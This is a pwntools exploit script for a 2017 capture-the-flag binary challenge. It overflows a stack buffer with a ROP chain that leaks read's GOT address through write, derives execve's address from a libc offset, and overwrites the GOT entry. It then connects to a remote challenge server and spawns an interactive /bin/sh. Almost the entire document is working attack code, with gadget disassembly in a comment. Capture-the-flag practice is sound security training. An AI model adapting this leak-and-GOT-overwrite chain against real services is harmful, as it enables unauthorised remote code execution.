from pwn import *
import time

fp		= '/root/Documents/BackDoorCTF/backdoorCTF-2017/just-do-it/32_chal'
elf		= ELF(fp)

write_plt	= elf.plt['write']
read_plt	= elf.plt['read']
read_got	= elf.got['read']

print "write@plt: "+hex(write_plt)
print "read@plt: "+hex(read_plt)
print "read@got: "+hex(read_got)

#read_offset	= 0xd6c60
#exec_offset	= 0xaf590
#r_exec_diff	= 0x25600
rmt_exec_offset	= 0x24dc0

#first write call
write1		= p32(write_plt)
write_arg1	= p32(0x1)
write_arg2	= p32(read_got)
write_arg3	= p32(0x4)

read1		= p32(read_plt)
r_arg1		= p32(0x0)
r_arg2		= p32(read_got)
r_arg3		= p32(0x20)

execve		= p32(read_plt)
e_arg1		= p32(read_got+0x4)
e_arg2		= p32(0x0)
e_arg3		= p32(0x0)

offset		= 112
junk		= '\x42' + '\x00' + '\x41'*(offset-2)
rop_pop12	= p32(0x08048563)

payload		= junk
payload		+= write1
payload		+= rop_pop12
payload		+= write_arg1
payload		+= write_arg2
payload		+= write_arg3
payload		+= read1
payload		+= rop_pop12
payload		+= r_arg1
payload		+= r_arg2
payload		+= r_arg3
payload		+= execve
payload		+= '\x42'*4
payload		+= e_arg1
payload		+= e_arg2
payload		+= e_arg3

print len(payload)
fd		= open("/root/Documents/BackDoorCTF/backdoorCTF-2017/just-do-it/payload.txt", "w")
if(fd):
	fd.write(payload)
	fd.close()

#p		= process(fp)
r		= remote('163.172.176.29', 9036)
p		= r
sleep(0.1)
print "[>] Received: "+p.recvline()
p.send(payload)
sleep(0.1)

read_addr	= p.recvn(1)
print len(read_addr)
sleep(0.1)
read_addr	= p.recvn(4)
extra		= p.recv(timeout=1)
print len(read_addr)
read_addr	= unpack(read_addr, 32, endian='little', sign=False)
print "Leaked Read Address: "+hex(read_addr)

exec_addr	= read_addr - rmt_exec_offset
print "Calculated execve Address: "+hex(exec_addr)

payload2	= p32(exec_addr) + '//bin/sh\0'
p.send(payload2)
p.interactive()
'''
8048539:	83 c4 1c             	add    esp,0x1c
 804853c:	5b                   	pop    ebx
 804853d:	5e                   	pop    esi
 804853e:	5f                   	pop    edi
 804853f:	5d                   	pop    ebp
 8048540:	c3                   	ret

8048563:	83 c4 08             	add    esp,0x8
 8048566:	5b                   	pop    ebx
 8048567:	c3                   	ret
'''
